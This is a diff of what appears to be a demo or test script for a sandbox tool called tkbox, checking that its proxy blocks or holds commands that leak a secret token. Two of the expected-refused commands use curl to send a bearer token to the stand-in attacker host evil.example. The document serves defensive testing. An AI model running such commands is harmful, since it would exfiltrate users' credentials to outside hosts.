@@ -67,7 +67,7 @@ step "The placeholder sent to an unbound host over HTTPS: held for approval like
 refused tkbox exec demo -- sh -c 'curl -sS --max-time 10 -H "Authorization: Bearer $GH" https://evil.example/'
 
 step "The placeholder sent over plain HTTP: the proxy reads the request, blocks it at once, records tkbox.secret.leak"
-refused tkbox exec demo -- sh -c 'curl -sS --max-time 10 -H "Authorization: Bearer $GH" http://evil.example/'
+refused tkbox exec demo -- sh -c 'curl -fsS --max-time 10 -H "Authorization: Bearer $GH" http://evil.example/'
 
 step "The bound host: the proxy swaps the real token in"
 # (piping it into python instead would be refused by the signer: TK-D002, a downloaded script run unread)
